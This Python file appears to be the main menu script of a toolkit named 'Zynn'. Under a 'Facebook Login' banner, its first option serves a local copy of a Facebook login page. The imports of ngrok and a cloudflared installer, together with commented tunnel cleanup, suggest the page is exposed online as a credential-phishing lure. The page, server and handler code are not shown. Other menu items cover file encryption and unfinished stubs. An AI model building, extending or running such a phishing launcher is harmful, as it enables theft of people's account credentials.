import subprocess

# Run pip freeze and save to requirements.txt
# subprocess.run(['pip', 'freeze'], stdout=open('requirements.txt', 'w'))

# Install dependencies from requirements.txt
# subprocess.check_call([ 'pip', 'install', '-r', 'requirements.txt'])

import os
import shutil
import re
import requests
import zipfile
from urllib.parse import urlparse
import platform
import tarfile
import time
from urllib.parse import unquote
import webbrowser
from http.server import SimpleHTTPRequestHandler, HTTPStatus
import socketserver
from pyngrok import ngrok
from pyfiglet import Figlet
from termcolor import colored
from scripts.encryption_decryption import encrypt_file, decrypt_file
from scripts.server import setup_server
from scripts.install import install_cloudflared
from ipwhois import IPWhois
import socketserver
from datetime import datetime
from controllers.Controller import MyHandler

red='red'
green='green'
yellow='yellow'

if not os.path.exists('server'):
    os.makedirs('server')

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_animation(text, color='red', delay=0.03):
    for char in text:
        colored_char = colored(char, color=color)
        print(colored_char, end='', flush=True)
        time.sleep(delay)
    print()

def print_colored_text_with_animation(text, color='red', delay=0.03):
    for line in text.split('\n'):
        type_animation(line, color=color, delay=delay)

def print_colored_zynn():
    clear_terminal()
    zynn = f"""
 {colored("-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷", color=red)}
 {colored(" ███████╗██╗░░░██╗███╗░░██╗███╗░░██╗", color=red)}
 {colored(" ╚════██║╚██╗░██╔╝████╗░██║████╗░██║", color=red)}
 {colored(" ░░███╔═╝░╚████╔", color=red)}{colored(" V-0 ", color=green)}{colored("██╗██║██╔██╗██║", color=red)}
 {colored(" ██╔══╝░░░░╚██╔╝░░██║╚████║██║╚████║", color=red)}
 {colored(" ███████╗░░░██║░░░██║░╚███║██║░╚███║", color=red)}
 {colored(" ╚══════╝░░░╚═╝░░░╚═╝░░╚══╝╚═╝░░╚══╝", color=red)}
 {colored("-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷-̷", color=red)}
    """
    print(zynn)

def small_title_fb():
    clear_terminal()
    fb_login = """
 █▀▀ ▄▀█ █▀▀ █▀▀ █▄▄ █▀█ █▀█ █▄▀   █░░ █▀█ █▀▀ █ █▄░█
 █▀░ █▀█ █▄▄ ██▄ █▄█ █▄█ █▄█ █░█   █▄▄ █▄█ █▄█ █ █░▀█"""

    print(colored(fb_login,color=red))


def main():
  try:
    menu_text = """
  1 -> Login page
  2 -> File Encryption/Decryption
  3 -> Chatbot
  4 -> Weather
  5 -> Image Download
  5 -> Exit
    """
    print_colored_text_with_animation(menu_text, color='green', delay=0.03)
    user_choice = input(f'  {colored("What do you want to do:", color=green)} ')
    clear_terminal()

    if user_choice == '1':
        setup_server('views/facebook/login.html')
    elif user_choice == '2':
       encryption_and_decryption()
    else:
       print_colored_zynn()
       print(colored('    Invalid choice. Please select a valid option.', color='red'))
       main()
  except KeyboardInterrupt:
    print("\nScript interrupted. Cleaning up resources...")
    clear_terminal()


def encryption_and_decryption():
    print(colored("""   
    ________  Eɴᴄʀʏᴘᴛɪᴏɴ/Dᴇᴄʀʏᴘᴛɪᴏɴ  ________ """, color='red'))
    encrypt_or_decrypt = """
    [1] Encrypt File
    [2] Decrypt File
    [3] Exit
    """
    print_colored_text_with_animation(encrypt_or_decrypt, color=green, delay=0.03)
    user_choice = input('    \033[32mWhat do you want to do:\033[0m ')
    if user_choice == '1':
        encrypt_file()
    elif user_choice == '2':
        decrypt_file()
    elif user_choice == '3':
        clear_terminal()
        print_colored_zynn()
        main()
    else:
       user_choice = input('    \033[32mPlease select [1,2,3]:\033[0m ')


if __name__ == "__main__":
    print_colored_zynn()
    main()
    
# except KeyboardInterrupt:
#       print("\nStopping the server and Cloudflared tunnel...")
#       try:
#           # Stop the server
#           httpd.shutdown()
#           httpd.server_close()
#           # Terminate the Cloudflared process
#           cloudflared_process.terminate()
#           print("\nServer and Cloudflared tunnel stopped.")
#       except Exception as e:
#       print(f"\nError during cleanup: {e}")